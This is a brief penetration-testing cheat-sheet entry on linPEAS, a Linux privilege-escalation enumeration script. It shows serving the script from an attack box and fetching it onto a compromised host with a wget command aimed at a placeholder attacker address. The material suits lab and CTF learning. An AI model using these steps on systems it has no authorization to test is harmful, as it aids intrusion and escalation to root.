
## Quick-Use

**Commands**:
- Copy or download the `linpeas.sh` shell script found on `https://github.com/peass-ng/PEASS-ng/releases/latest`
- in your attack box, in the folder where you would like to serve the shell script: `python3 -m http.server 80`
- in the shell on the host you're attacking: 
```bash
$ cd /tmp
$ wget http://ATTKIPADDR/linpeas.sh
```

## General

**Objectives**: 
Get shell access on system with write and execute perms -> upload (or download from the reverse shell) linpeas.sh -> execute linpeas

**Overview**:
Shell script that allows you to enumerate potential paths to escalate from a low-level user shell to more authoritative shells and eventually `root`.
## Glossary